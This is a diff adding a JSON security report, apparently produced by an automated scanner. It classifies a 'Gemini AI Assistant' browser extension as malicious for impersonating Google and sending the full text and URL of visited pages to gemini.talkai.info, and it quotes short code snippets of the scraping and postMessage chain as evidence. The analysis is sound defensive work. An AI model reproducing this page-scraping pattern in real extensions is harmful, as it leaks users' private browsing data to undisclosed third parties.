@@ -1,0 +1,74 @@
+{
+  "extension_id": "aibfeemadfncnhephomomdicckopkgoe",
+  "extension_name": "Gemini AI Assistant",
+  "version": "Unknown",
+  "user_count": 2000,
+  "dataset": "gemini",
+  "verdict": "MALICIOUS",
+  "confidence": 1.0,
+  "recommendation": "BLOCK",
+  "reasoning": "The extension is classified as malicious due to deceptive practices and unauthorized data exfiltration. While it markets itself as a 'Gemini AI Assistant' and opens the official Google Gemini page during installation to gain legitimacy, its core functionality involves scraping the full text of any page the user visits (via document.body.innerText) and sending it to an undisclosed third-party domain (talkai.info). This allows the third-party to ingest potentially sensitive data from any website the user browses, including private dashboards or logged-in sessions, without the user realizing the data is leaving Google's ecosystem.",
+  "full_validation": {
+    "extension_id": "aibfeemadfncnhephomomdicckopkgoe",
+    "verdict": "MALICIOUS",
+    "confidence": 1.0,
+    "reasoning": "The extension is classified as malicious due to deceptive practices and unauthorized data exfiltration. While it markets itself as a 'Gemini AI Assistant' and opens the official Google Gemini page during installation to gain legitimacy, its core functionality involves scraping the full text of any page the user visits (via document.body.innerText) and sending it to an undisclosed third-party domain (talkai.info). This allows the third-party to ingest potentially sensitive data from any website the user browses, including private dashboards or logged-in sessions, without the user realizing the data is leaving Google's ecosystem.",
+    "recommendation": "BLOCK",
+    "key_concerns": [
+      "Impersonation of official Google Gemini services.",
+      "Full page content scraping (PII risk) from any visited URL.",
+      "Data transmission to an undisclosed third-party service (talkai.info).",
+      "Broad host permissions used to monitor all browsing activity."
+    ],
+    "evidence": {
+      "exfiltration_chain": {
+        "data_collected": "Full visible text of any webpage visited (document.body.innerText) and the current URL.",
+        "processing_method": "The sidePanelWrapper.js content script extracts the full page text and URL, which is then requested by sidePanel.js via messaging and subsequently passed into an iframe via postMessage.",
+        "destination_domain": "https://gemini.talkai.info/chat/",
+        "code_evidence": "sidePanelWrapper.js: 'getPageText' === e.action && a({ pageContent: document.body.innerText.trim(), url: window.location.href }); sidePanel.js: document.getElementById('chatBot-sidepanel-iframe').contentWindow.postMessage(e, '*')"
+      },
+      "dual_purpose": {
+        "stated_purpose": "Gemini AI Assistant (implies official Google/Gemini integration).",
+        "hidden_functionality": "The extension uses a bait-and-switch tactic. It opens the official gemini.google.com on install to establish trust, but then redirects user data to a third-party domain (talkai.info) for the actual processing/chat functionality, effectively scraping user pages for an undisclosed third party.",
+        "code_evidence": "service-worker.js: chrome.tabs.create({ url: 'https://gemini.google.com/app' }); sidePanelWrapper.js: var e = 'https://gemini.talkai.info/chat/', t = s?.getElementById?.('chatBot-sidepanel-iframe'); t && t.src !== e && (t.src = e)"
+      },
+      "credential_theft": {
+        "capture_mechanism": null,
+        "transmission_target": null,
+        "code_evidence": null
+      }
+    },
+    "domains": {
+      "legitimate": [
+        "gemini.google.com",
+        "clients2.google.com"
+      ],
+      "requires_investigation": [
+        "gemini.talkai.info"
+      ],
+      "informational_only": []
+    },
+    "pattern_assessment": [
+      {
+        "pattern": "TABS_ACCESS",
+        "usage": "MALICIOUS",
+        "justification": "Used to inject content scripts into all open tabs upon installation to start scraping page content immediately without user navigation."
+      },
+      {
+        "pattern": "NETWORK_ENDPOINT (talkai.info)",
+        "usage": "MALICIOUS",
+        "justification": "Undisclosed third-party endpoint receiving the full text content of websites the user visits under the guise of being an official Gemini assistant."
+      },
+      {
+        "pattern": "INNERHTML",
+        "usage": "LEGITIMATE",
+        "justification": "Used for constructing the side-panel UI within a Shadow DOM."
+      }
+    ],
+    "token_usage": {
+      "prompt": 4375,
+      "candidates": 924,
+      "total": 6527
+    }
+  }
+}
